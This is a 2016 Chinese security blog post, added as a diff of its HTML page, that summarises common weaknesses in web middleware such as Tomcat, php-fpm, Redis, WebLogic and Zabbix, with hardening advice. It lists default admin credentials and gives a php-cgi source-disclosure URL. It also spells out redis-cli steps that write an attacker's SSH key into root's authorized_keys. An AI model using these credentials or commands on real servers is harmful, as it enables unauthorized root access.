@@ -1,0 +1,697 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="web安全," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="web中间件漏洞在web安全中也占有比较重的份额，即使代码写的很牛逼，一不小心用了一个不该用的中间件，GG… 基本攻击者就会哪里有洞钻哪里，本文总结了常见的几个中间件及利用方式。下一篇附上几个利用的自动化脚本。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web中间件漏洞汇总【一】">
+<meta property="og:url" content="http://lovexiaofeng.cn/2016/08/02/31/index.html">
+<meta property="og:site_name" content="小峰's Blog">
+<meta property="og:description" content="web中间件漏洞在web安全中也占有比较重的份额，即使代码写的很牛逼，一不小心用了一个不该用的中间件，GG… 基本攻击者就会哪里有洞钻哪里，本文总结了常见的几个中间件及利用方式。下一篇附上几个利用的自动化脚本。">
+<meta property="og:updated_time" content="2016-08-03T01:47:51.157Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="web中间件漏洞汇总【一】">
+<meta name="twitter:description" content="web中间件漏洞在web安全中也占有比较重的份额，即使代码写的很牛逼，一不小心用了一个不该用的中间件，GG… 基本攻击者就会哪里有洞钻哪里，本文总结了常见的几个中间件及利用方式。下一篇附上几个利用的自动化脚本。">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"always"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://lovexiaofeng.cn/2016/08/02/31/"/>
+
+  <title> web中间件漏洞汇总【一】 | 小峰's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">小峰's Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">一个不抽烟 不喝酒的少年</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                web中间件漏洞汇总【一】
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">更新于</span>
+            <time itemprop="dateCreated" datetime="2016-08-02T17:08:03+08:00" content="2016-08-02">
+              2016-08-02
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="web中间件漏洞在web安全中也占有比较重的份额，即使代码写的很牛逼，一不小心用了一个不该用的中间件，GG…-基本攻击者就会哪里有洞钻哪里，本文总结了常见的几个中间件及利用方式。下一篇附上几个利用的自动化脚本。"><a href="#web中间件漏洞在web安全中也占有比较重的份额，即使代码写的很牛逼，一不小心用了一个不该用的中间件，GG…-基本攻击者就会哪里有洞钻哪里，本文总结了常见的几个中间件及利用方式。下一篇附上几个利用的自动化脚本。" class="headerlink" title="web中间件漏洞在web安全中也占有比较重的份额，即使代码写的很牛逼，一不小心用了一个不该用的中间件，GG… 基本攻击者就会哪里有洞钻哪里，本文总结了常见的几个中间件及利用方式。下一篇附上几个利用的自动化脚本。"></a>web中间件漏洞在web安全中也占有比较重的份额，即使代码写的很牛逼，一不小心用了一个不该用的中间件，GG… 基本攻击者就会哪里有洞钻哪里，本文总结了常见的几个中间件及利用方式。下一篇附上几个利用的自动化脚本。</h3><a id="more"></a>
+<h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><p>Apache是web服务器，Tomcat是应用（java）服务器，它只是一个servlet容器，是Apache的扩展。Apache和Tomcat都可以做为独立的web服务器来运行，但是Apache不能解释java程序（jsp,serverlet）。两者都是一种容器，只不过发布的东西不同：Apache是html容器，功能像IIS一样；Tomcat是jsp/servlet容器，用于发布jsp及java的，类似的有IBM的webshere、EBA的Weblogic，sun的JRun等等。Tomcat是一个开放源代码、运行servlet和JSP Web应用软件的基于Java的Web应用软件容器。Tomcat Server是根据servlet和JSP规范进行执行的，因此我们就可以说Tomcat Server也实行了ApacheJakarta规范且比绝大多数商业应用软件服务器要好。</p>
+<h3 id="Apache-Tomcat常见漏洞"><a href="#Apache-Tomcat常见漏洞" class="headerlink" title="Apache Tomcat常见漏洞:"></a>Apache Tomcat常见漏洞:</h3><p>-/manager/html 管理弱口令<br>-admin - admin<br>-tomcat - tomcat</p>
+<h3 id="特征"><a href="#特征" class="headerlink" title="特征:"></a>特征:</h3><p>8080端口 tomcat默认界面</p>
+<h3 id="安全加固"><a href="#安全加固" class="headerlink" title="安全加固"></a>安全加固</h3><p>1、首先是Tomcat的版本问题，要考虑到版本是否存在安全问题，要及时的升级到最新版本；<br>2、其次就是安全配置，对于不是root用户的权限以最小权限为原则，为Tomcat的日志目录以及WEB目录单独分配权限，分配”只读”和”写入”权限即可；<br>3、建议删除该管理页面。方法是将%tocmat_home%/conf/Catalina/localhost目录下的manager.xml删除掉。<br>4、如果一定要使用的话，建议将该manager.xml的文件名修改为一个难猜测出来的文件名，并且找到Tomcat安装目录的conf目录下的tomcat-user.xml，设置一个复杂的管理员账号和密码！</p>
+<h2 id="php-fpm"><a href="#php-fpm" class="headerlink" title="php-fpm"></a>php-fpm</h2><p>php-fpm是一个phpFastCGI管理器，只用于php</p>
+<h3 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h3><p>9000端口对外开放，允许所有人连接的情况下存在远程代码执行漏洞</p>
+<h3 id="特征："><a href="#特征：" class="headerlink" title="特征："></a>特征：</h3><p>9000端口开放<br>php-fpm 远程代码执行</p>
+<h3 id="影响系统"><a href="#影响系统" class="headerlink" title="影响系统"></a>影响系统</h3><p>PHP &lt; 5.4.2<br>PHP &lt; 5.3.12</p>
+<h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>PHP是一种在服务器端执行的嵌入HTML文档的脚本语言。基于PHP-CGI的设置在解析PHP文件查询字符串参数时存在一个漏洞，允许远程攻击者可以利用漏洞执行任意代码。当使用PHP-CGI设置时(如Apache mod_cgid模块)，php-cgi接收查询字符串作为命令行参数，这些参数允许命令行开关如-s, -d或-c传递给php-cgi进程，可被利用泄露源代码或执行任意代码。<br>如-s命令，允许攻击者获取index.php的源代码：</p>
+<pre><code>http://localhost/index.php?-s
+</code></pre><p>其中Apache+mod_php和nginx+php-fpm不受此漏洞影响。</p>
+<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>-可使用第三方封装程序处理参数数据<br>-针对PHP进行补丁处理，如果php-cgi以非fastcgi cgi调用禁用参数解析。</p>
+<h2 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h2><p>redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存可持久化的日志型、keygen-Value数据库，并提供多种语言的API</p>
+<h3 id="常见漏洞-1"><a href="#常见漏洞-1" class="headerlink" title="常见漏洞"></a>常见漏洞</h3><p>Redis手动编译安装，默认配置允许外部链接，且没有密码（如果Redis运行在root权限上，可以任意写文件）。</p>
+<h3 id="特征-1"><a href="#特征-1" class="headerlink" title="特征"></a>特征</h3><p>6379端口开放</p>
+<h3 id="redis未授权访问写免密码登录条件："><a href="#redis未授权访问写免密码登录条件：" class="headerlink" title="redis未授权访问写免密码登录条件："></a>redis未授权访问写免密码登录条件：</h3><p>1.Redis服务使用ROOT账号启动<br>2.Redis服务无密码认证或者使用的是弱口令进行认证<br>3.服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1、本地生成一对密钥</p>
+<pre><code>ssh-keygen -t rsa
+</code></pre><p>2、连上redis服务器：</p>
+<pre><code>redis-cli -h ip
+config set dir /root/.ssh/
+config set dbfilename authorized_keys
+set xxx &quot;\n\n\n id_rsa_pub \n\n\n&quot;
+save
+exit
+</code></pre><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>该漏洞的修补方法如下：<br>1）禁止使用 root 权限启动 redis 服务；<br>2）对 redis 访问启用密码认证，并且添加 IP 访问限制；<br>3）尽可能不对公网直接开放 SSH 服务。</p>
+<h2 id="Resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h2><p>Resin是CAUCHO公司的成品，是一个非常流行的application server，对server和JSP提供了良好的支持，性能也比较优良，resin自身采用JAVA语言开发</p>
+<h3 id="常见漏洞-2"><a href="#常见漏洞-2" class="headerlink" title="常见漏洞"></a>常见漏洞</h3><p>Resin viewfile远程文件读取漏洞<br>特征<br>/resin—doc/ 目录</p>
+<h2 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h2><p>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和JavaEnterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
+<h3 id="常见漏洞-3"><a href="#常见漏洞-3" class="headerlink" title="常见漏洞"></a>常见漏洞</h3><p>管理后台弱密码 weblogic/weblogic<br>反序列化代码执行</p>
+<h3 id="特征-2"><a href="#特征-2" class="headerlink" title="特征"></a>特征</h3><p>7001端口<br>7002端口</p>
+<h2 id="Zabbix"><a href="#Zabbix" class="headerlink" title="Zabbix"></a>Zabbix</h2><p>zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。zabbix由2部分构成，zabbix server与可选组件zabbix agent。zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，它可以运行在Linux，Solaris，HPUX，AIX，Free BSD ，Open，BSD，OS X等平台上。</p>
+<h3 id="常见漏洞-4"><a href="#常见漏洞-4" class="headerlink" title="常见漏洞"></a>常见漏洞</h3><p>后台guest-guest未禁用，造成信息泄露<br>后台admin-zabbix默认口令<br>Zabbix 2.0.8 -SQL Injection<br>zabbix 登录界面</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>如果喜欢我，就请我喝咖啡吧！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="https://github.com/xiaofengtongxue/xiaofengtongxue.github.io/blob/master/images/a.jpg?raw=true" alt="ih0cker WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web安全/" rel="tag">#web安全</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/08/02/30/" rel="next" title="windows安全项检查">
+                <i class="fa fa-chevron-left"></i> windows安全项检查
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            博主简介
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/img.jpg"
+               alt="ih0cker" />
+          <p class="site-author-name" itemprop="name">ih0cker</p>
+          <p class="site-description motion-element" itemprop="description">沉默，可以让混乱的心，变得清澈。</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">32</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">10</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/xiaofengtongxue" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/your-user-name" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/p/1005053869837461/home?from=page_100505&mod=TAB&is_hot=1#place" target="_blank" title="微博">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  微博
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.zhihu.com/people/helay" target="_blank" title="知乎">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  知乎
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://leelie.github.io" title="伟哥's Blog" target="_blank">伟哥's Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://wkh.dropsec.xyz/" title="加油、未来's Blog" target="_blank">加油、未来's Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://scorpoin.github.io" title="棟棟's Blog" target="_blank">棟棟's Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.sina.com.cn/u/5619564526" title="磊磊's Blog" target="_blank">磊磊's Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://liulangdelmao.github.io/" title="小卓's Blog" target="_blank">小卓's Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://nouername.github.io" title="飞妹妹's Blog" target="_blank">飞妹妹's Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://shawnleon.github.io/" title="Leon's Blog" target="_blank">Leon's Blog</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#web中间件漏洞在web安全中也占有比较重的份额，即使代码写的很牛逼，一不小心用了一个不该用的中间件，GG…-基本攻击者就会哪里有洞钻哪里，本文总结了常见的几个中间件及利用方式。下一篇附上几个利用的自动化脚本。"><span class="nav-number">1.</span> <span class="nav-text">web中间件漏洞在web安全中也占有比较重的份额，即使代码写的很牛逼，一不小心用了一个不该用的中间件，GG… 基本攻击者就会哪里有洞钻哪里，本文总结了常见的几个中间件及利用方式。下一篇附上几个利用的自动化脚本。</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tomcat"><span class="nav-number"></span> <span class="nav-text">Tomcat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Apache-Tomcat常见漏洞"><span class="nav-number">1.</span> <span class="nav-text">Apache Tomcat常见漏洞:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#特征"><span class="nav-number">2.</span> <span class="nav-text">特征:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#安全加固"><span class="nav-number">3.</span> <span class="nav-text">安全加固</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php-fpm"><span class="nav-number"></span> <span class="nav-text">php-fpm</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常见漏洞"><span class="nav-number">1.</span> <span class="nav-text">常见漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#特征："><span class="nav-number">2.</span> <span class="nav-text">特征：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#影响系统"><span class="nav-number">3.</span> <span class="nav-text">影响系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞信息"><span class="nav-number">4.</span> <span class="nav-text">漏洞信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解决方案"><span class="nav-number">5.</span> <span class="nav-text">解决方案</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#redis"><span class="nav-number"></span> <span class="nav-text">redis</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常见漏洞-1"><span class="nav-number">1.</span> <span class="nav-text">常见漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#特征-1"><span class="nav-number">2.</span> <span class="nav-text">特征</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#redis未授权访问写免密码登录条件："><span class="nav-number">3.</span> <span class="nav-text">redis未授权访问写免密码登录条件：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞修复"><span class="nav-number">5.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Resin"><span class="nav-number"></span> <span class="nav-text">Resin</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常见漏洞-2"><span class="nav-number">1.</span> <span class="nav-text">常见漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#weblogic"><span class="nav-number"></span> <span class="nav-text">weblogic</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常见漏洞-3"><span class="nav-number">1.</span> <span class="nav-text">常见漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#特征-2"><span class="nav-number">2.</span> <span class="nav-text">特征</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Zabbix"><span class="nav-number"></span> <span class="nav-text">Zabbix</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常见漏洞-4"><span class="nav-number">1.</span> <span class="nav-text">常见漏洞</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ih0cker</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://lovexiaofeng.cn">小峰</a> 强力推荐
+</div>
+
+<div class="theme-info">
+  博主 -
+  <a class="theme-link" href="https://lovexiaofeng.cn">
+    小峰
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
